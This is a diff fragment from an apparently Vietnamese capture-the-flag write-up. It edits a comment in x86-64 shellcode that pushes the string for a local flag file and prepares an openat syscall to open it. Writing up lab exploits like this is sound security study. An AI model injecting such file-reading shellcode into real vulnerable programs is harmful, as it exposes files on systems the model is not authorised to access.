@@ -25,7 +25,7 @@ Vì mục tiêu của chúng ta chỉ là flag nằm trong thư mục hiện t�
 
 Shellcode mở file:
 
-    mov rax, 113668128124718 // */flag\00*
+    mov rax, 113668128124718     --> */flag\00*
     push rax
     mov rax, 257             //syscall openat
     mov rdi, -100            //AT_FDCWD
